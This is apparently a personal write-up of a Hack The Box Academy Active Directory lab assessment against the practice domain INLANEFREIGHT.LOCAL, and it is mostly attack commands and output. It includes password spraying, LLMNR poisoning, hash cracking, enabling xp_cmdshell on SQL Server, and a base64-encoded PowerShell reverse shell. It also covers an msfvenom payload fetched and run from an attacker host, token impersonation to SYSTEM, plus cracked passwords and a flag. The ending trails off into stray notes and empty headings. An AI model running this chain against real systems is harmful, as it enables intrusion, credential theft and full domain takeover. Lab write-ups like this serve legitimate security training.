# AD Enumeration & Attacks - Skills Assessment Part II

## Objective

>The client is not concerned about stealth/evasive tactics and has also provided us with a Parrot Linux VM within the internal network to get the best possible coverage of all angles of the network and the Active Directory environment. 
>Connect to the internal attack host via SSH (you can also connect to it using xfreerdp) and begin looking for a foothold into the domain. 
>Once you have a foothold, enumerate the domain and look for flaws that can be utilized to move laterally, escalate privileges, and achieve domain compromise.  

## Internal Access  

>Connect to the provided internal kali via SSH to `10.129.50.115` with user `htb-student` and password `HTB_@cademy_stdnt!`.  

```
ssh htb-student@10.129.50.115
```  

>NMAP scan of the subnet `172.16.7.1-255`, revealed the 4 targets, and setting up proxychains enable the forwarding/pivoting of traffic from our Kali host on `10.10.15.204` to the remote subnet `172.16.7.x`.  

>Dynamic SSH port 9050 forwarding from parrot host via Kali attacker.  

```
ssh -D 9050 htb-student@10.129.50.115
```  

Configure the proxy chain config file, `/etc/proxychains.conf` on parrot host, `10.129.50.115` to direct traffic via socks4 on port `9050`.

```
sudo vi /etc/proxychains.conf
```  

>Proxychains.conf last 10 lines configuration of `socks4  127.0.0.1 9050`.  

```
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 9050
```  

>Test proxy chains from Kali host.

```
proxychains nmap -v -p 3389 172.16.7.240
```  

>XFreeRDP Connect to RDP on remote Ubuntu host:  

```
proxychains xfreerdp /v:172.16.7.240 /u:htb-student /p:'HTB_@cademy_stdnt!' /size:75%w /cert:ignore
```  



## Initial Enumeration  

>NMAP Scans.  

```
sudo nmap 172.16.7.0-255 -p 21,22,25,80,88,389,445,111,113,139,8080,3389,5985,53,443,464,593,636,3268,1433 --open -sCV -A -O

sudo nmap 172.16.7.60 -sCV -A -O
```  

### NMAP Results - 172.16.7.3(DC01)  

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-09 17:53:16Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
```

### NMAP Results - 172.16.7.50(MS01)  

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=MS01.INLANEFREIGHT.LOCAL
| Not valid before: 2023-07-08T15:12:09
|_Not valid after:  2024-01-07T15:12:09
|_ssl-date: 2023-07-09T17:55:13+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: MS01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: MS01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2023-07-09T17:55:08+00:00
```  

### NMAP Results - 172.16.7.60(SQL01)  

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-07-09T15:12:14
|_Not valid after:  2053-07-09T15:12:14
|_ssl-date: 2023-07-09T17:57:20+00:00; 0s from scanner time.
| ms-sql-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: SQL01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: SQL01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|_  Product_Version: 10.0.17763
```  

>Discovered information about target domain controller and domain:  

```
172.16.7.3 - DC01
INLANEFREIGHT.LOCAL
DC01.INLANEFREIGHT.LOCAL
```  

>Enumerating Users with Kerbrute and the username list from [jsmith](https://github.com/insidetrust/statistically-likely-usernames).  

```
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.7.3 /opt/statistically-likely-usernames/jsmith2.txt --output more-users.txt
```

>output found 57 logins for valid users from above command.  

>Scan for info usign null sessions.  

```
enum4linux-ng -U 172.16.7.3 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```  
>Obtain the DOMAIN SID: `S-1-5-21-3327542485-274640656-2609762496`.  

>Kerbrute password spray:

```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 discovered-users.txt  Welcome1
```  

>RPC Client with NULL session.

```
rpcclient -U "" -N 172.16.7.3
getdompwinfo
```

>No output, access denied.  

### LLMNR/NTB-NS Poisoning  

>Used from a Linux-based host. LLMNR/NBT-NS Poisoning - from Linux - Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.

```
sudo responder -I ens224 -Pv
```  

>Obtained NTLMv2 hash for user `AB920`. Then crack hash with hashcat.  

```
hashcat.exe -m 5600 s:\hashes\9july2023.hash s:\wordlists\rockyou.txt -O
```  

>Credentials cracked results:  

```
AB920::INLANEFREIGHT:e296c23f480995bc:86084dc35831b56dc49082e082757141:01010<snip>000000000:weasal
```  

## AD Foothold  

>Obtained a password by cracking the hash for domain user account, `AB920`, with password of `weasal` and leveraged to gain a foothold in the domain. 

### Password Policy & Spray 

```
crackmapexec smb 172.16.7.3 -u AB920 -p weasal -d inlanefreight.local --pass-pol

crackmapexec smb 172.16.7.3 -u just-valid-names.txt -p weasal -d inlanefreight.local --continue-on-success
```

>Output

```
SMB         172.16.7.3      445    DC01             Minimum password length: 1
SMB         172.16.7.3      445    DC01             Password history length: None
SMB         172.16.7.3      445    DC01             Maximum password age: 41 days 23 hours 53 minutes 
SMB         172.16.7.3      445    DC01             
SMB         172.16.7.3      445    DC01             Password Complexity Flags: 000000
SMB         172.16.7.3      445    DC01                 Domain Refuse Password Change: 0
SMB         172.16.7.3      445    DC01                 Domain Password Store Cleartext: 0
SMB         172.16.7.3      445    DC01                 Domain Password Lockout Admins: 0
SMB         172.16.7.3      445    DC01                 Domain Password No Clear Change: 0
SMB         172.16.7.3      445    DC01                 Domain Password No Anon Change: 0
SMB         172.16.7.3      445    DC01                 Domain Password Complex: 0
SMB         172.16.7.3      445    DC01             
SMB         172.16.7.3      445    DC01             Minimum password age: None
SMB         172.16.7.3      445    DC01             Reset Account Lockout Counter: 30 minutes 
SMB         172.16.7.3      445    DC01             Locked Account Duration: 30 minutes 
SMB         172.16.7.3      445    DC01             Account Lockout Threshold: None
SMB         172.16.7.3      445    DC01             Forced Log off Time: Not Set
```  

>Shares

```
smbclient \\\\172.16.7.3\\Department\ Shares -U 'inlanefreight.local\AB920' -c 'recurse;ls'
```  

>Brute Forcing

```
kerbrute -users just-valid-names.txt -passwords /usr/share/wordlists/rockyou.txt -dc-ip 172.16.7.3 -domain 'inlanefreight.local' -outputfile kerb_output.txt
```

### BloodHound  

>Enumeration of AD with authentication using bloodhound-python will produce the `JSON` Active Directory data files.  

```
sudo bloodhound-python -u 'AB920' -p 'weasal' -ns 172.16.7.3 -d inlanefreight.local -c all
```  

>Restart bloodhound database.  

```
sudo neo4j status
sudo neo4j stop
sudo neo4j start
```  

>Check bloodhound service database by browsing to [http://localhost:7474/](http://localhost:7474/).
>Login with above user `neo4j` and password `HTB_@cademy_stdnt!`, and click connect in browser.  

> start bloodhound GUI, and upload the `JSON` Active Directory data files collected.

```
bloodhound
```  

>Mark User `AB920` as owned in bloodhound.  

## AD Enumeration  

### Remote Desktop to MS01  
 
>Using proxy chains configured on parrot host to connect to MS01 via RDP as user `AB920`.

```
proxychains xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /d:inlanefreight.local /dynamic-resolution /drive:kali-drive,/home/kali/Downloads/htb/academy/ActiveDirectory
```  

>Open local computer management and checking who is part of local administrators by running `lusrmgr.msc` from windows server.

>Discover AD group `Tier II Server Admins` is part of the local administrators. Get members using bloodhound GUI.  


### PowerView  

>Copy PowerView to target and in PowerShell import the PowerView module.  

```
powershell
import-module ./powerview.ps1
```  

>Get list of all Active Directory users using the `PowerView` module.  

```
Get-DomainUser | Select-Object samaccountname >all-ad-users.txt
```  

### Weak Password Spray

>Test for weak passwords using the true list of all AD users obtained using the PowerView module, `Get-DomainUser`.  
>Kerbrute with the `passwordspray` parameter to test weak password of `Welcome1`.  

```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 true-all-users.txt Welcome1
```

>Results is new compromised user `BR086`, with weak password of `Welcome1`.  

```
2023/07/09 16:38:11 >  [+] VALID LOGIN:  BR086@inlanefreight.local:Welcome1
```  

## AD Lateral Movement  

>Aim is to get new privileges on domain on another server.  

>Repeat enumeration and scanning commands for previously no discovered content, by attacking common services again.

### SMB - New Creds  

>Using BR086 to look at server shares.  

```
smbclient \\\\172.16.7.3\\Department\ Shares -U 'inlanefreight.local\BR086' -c 'recurse;ls'
smbclient \\\\172.16.7.3\\Department\ Shares -U 'inlanefreight.local\BR086'

cd \IT\Private\Development
get web.config
```

>Contents of web.config contain SQL connection string.
>File `web.config` credentials:  

```
<connectionStrings>
<add name="ConString" connectionString="Environment.GetEnvironmentVariable("computername")+'\SQLEXPRESS';Initial Catalog=Northwind;User ID=netdb;Password=D@ta_bAse_adm1n!"/>
```  

>Located a configuration file containing an MSSQL connection string. The Credentials discovered, `netdb` and password is `D@ta_bAse_adm1n!`.  



### MS SQL  

>Successfully able to login to Microsoft SQL service on server `SQL01` through port `1433`, as newly discovered credentials in the SMB share `\\DC01\Department Shares\IT\Private\Development` for SQL connection string user `netdb`.  

```
proxychains sqsh -S 172.16.7.60 -U netdb -P 'D@ta_bAse_adm1n!' 
```  

>Execute SQL command on remote host.

```
EXEC [SQL01\SQLEXPRESS].master.dbo.sp_configure 'show advanced options', 1;
go

EXECUTE sp_configure 'xp_cmdshell', 1
go

xp_cmdshell 'whoami'
go
```

>Successfully got RCE on remote windows target.

### Low Privilege Reverse Shell  

>Using the PowerShell Base64 Reverse Shell option at [https://www.revshells.com/](https://www.revshells.com/) to generate below payload.  

```
1> xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgA3AC4AMgA0ADAAIgAsADQANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
2> go

```  

>Metasploit handler accept the incoming connection from server SQL01.

>Start again Enumeration on server SQL01 to obtain administrator access.
>The reverse shell obtained run as the user `nt service\mssql$sqlexpress` and running `whoami /priv`, the user has the privileges of `SeImpersonatePrivilege` on the windows target.  

### SeImpersonatePrivilege Enabled

Create Payload to upload via low priv shell
msfvenom payloads

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=7777 -f exe >shell7777.exe
```

>Setup msfconsole multi/handler listener port 7777

```
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 172.16.7.240
set lport 7777
set AutoRunScript post/windows/manage/migrate

options
run
```  

>Host HTTP Python server and then Transfer `shell777.exe` payload using PowerShell in the low privilege shell on the server `SQL01`. then start powershell process with the msfvenom executable payload on target.  


```
python3 -m http.server 80000

(new-object net.webclient).downloadfile('http://172.16.7.240:8000/shell7777.exe', 'C:\tools\shell7777.exe')

start-process shell7777.exe
```


### MetaSploit Incognito

>MetaSploit handler Answers, and running meterpreter - load incognito module.  

```
getuid
load incognito

getprivs

list_tokens -u
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



impersonate_token "NT AUTHORITY\SYSTEM"


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
### inside meterpreter metasploit
impersonate_token "NT AUTHORITY\SYSTEM"

getuid
shell
ps
###  shell fail
###  migrate to another process
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~




Meterpreter - Migrate to another Process

Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions -
 it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). 
 Ensure that you migrate to a process with correct permissions 
 The safest process to pick is the services.exe process. 
 First use the ps command to view processes and find the PID of the services.exe process.
  Migrate to this process using the command migrate PID-OF-PROCESS


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ps
###    migrate <process PID number>
migrate 2980
shell

###   success to a process running as NT Authority\SYSTEM

whoami
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


ROOT - NT Authority\SYSTEM


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root.txt file at C:\Windows\System32\config
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


dff0f748678f280250f25a45b8046b4a
Jeeves








## AD Privilege Escalation  



## AD Compromise  



